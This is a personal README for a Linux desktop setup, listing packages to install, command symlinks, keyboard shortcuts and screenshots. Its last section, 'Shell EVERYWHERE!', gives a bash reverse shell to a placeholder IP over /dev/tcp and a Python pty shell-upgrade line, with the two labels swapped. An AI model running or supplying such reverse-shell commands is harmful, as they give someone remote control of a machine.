## ZyDesk
Setup for my Desktop, some configurations for my Desktop themes and shortcuts.  

### My Current Desktop

### With Default Panel
<p align="center">
  <img src="wallpaper/my-panel.png">
</p>

### With Latte Dock
<p align="center">
  <img src="wallpaper/my-latte.png">
</p>

### Must HAVE Apps!!!
```
sudo apt install git wget curl python3-pip
sudo apt install zsh tmux fonts-powerline tilix python3-nautilus
sudo ln -s /etc/profile.d/vte-2.91.sh /etc/profile.d/vte.sh
sudo apt install polybar rofi ranger
sudo apt install neofetch tree htop fonts-noto-color-emoji telegram-desktop
```
- https://github.com/zyairelai/kali-anonsurf
- https://marktext.app/
```
chmod a+x {marktext.AppImage}
mv $HOME/Downloads/{marktext.AppImage} /usr/bin/marktext
```

### Personal Terminal Shortcuts
```
sudo ln -s /bin/xdg-open /bin/open
sudo ln -s /bin/python3 /bin/py
sudo ln -s /bin/python3 /bin/python
sudo ln -s /bin/clear /bin/c
sudo ln -s /bin/ranger /bin/r
```

### Keyboard Shortcuts
```
Home folder                         - Ctrl + Alt + F
Launch Web Browser                  - Ctrl + Alt + G
Marktext                            - Ctrl + Alt + M
Hide all normal windows             - Ctrl + Alt + D
Settings                            - Ctrl + Alt + S
Move to workspace above/below       - Ctrl + Alt + Up / Down
Move window one workspace up/down   - Super + Up / Down
Close window                        - Alt + W
```

### Shell EVERYWHERE!
1. Reversed Shell
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
2. Stable Shell
```
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```
